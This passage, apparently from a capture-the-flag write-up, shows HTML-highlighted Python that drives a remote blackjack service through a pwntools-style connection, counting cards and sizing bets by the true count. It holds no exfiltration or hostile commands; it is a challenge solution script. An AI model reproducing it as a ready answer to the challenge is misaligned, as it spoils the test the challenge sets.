\u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">update_count(card)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">cards_seen \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Resetting shoe\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"RESET COUNT\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">count \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">cards_seen \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Remaining balance\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">float\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(line.split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'$'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Dealer's up card\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">upcard \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> extract_cards_from_string(line)[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">game_state[\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'upcard'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">], _ \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> get_value([upcard])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">input_prompt \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> p.recv().decode()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"INPUT>>> \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> input_prompt)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"enter your bet\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> input_prompt:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># High risk high reward counting strategy\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">true_count \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(count \u003C/span>\u003Cspan style=\"--0:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> ((\u003C/span>\u003Cspan style=\"--0:#79B8FF\">52\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> cards_seen) \u003C/span>\u003Cspan style=\"--0:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#79B8FF\">52\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> true_count \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">bet \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">max\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">min\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> true_count \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">bet \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">max\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">min\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">500\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> true_count \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">bet \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">max\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">min\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2000\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> true_count \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">bet \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">max\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">min\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2000\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> true_count \u003C/span>\u003Cspan style=\"--0:#F97583\">>=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">5\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">bet \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">max\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">50\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">min\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2000\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">p.sendline(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">str\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(bet)))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> bet\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">game_state \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"What would you like to do?\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> input_prompt:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">options \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> input_prompt.split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"(\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">].split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\")\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">].split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\", \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(resp)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">my_cards \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [line \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line.startswith(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"(Hand \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)][\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">my_cards \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> extract_cards_from_string(my_cards)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">my_value, soft \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> get_value(my_cards)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> my_value \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">21\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">p.sendline(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"stand\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">continue\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">upcard \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> game_state[\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'upcard'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"My cards: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, my_cards)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"My value: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, my_value)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Soft: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, soft)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Upcard: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, upcard)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(my_cards) \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">and\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> my_cards[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> my_cards[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">and\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'split'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> options:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"USING PAIR STRATEGY\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">option \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PAIR\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[get_value([my_cards[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]])[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">][upcard \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> soft:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"USING HANDS WITH ACE STRATEGY\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">option \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">HANDS_WITH_ACE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[my_value \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">13\u003C/span>\u003Cspan 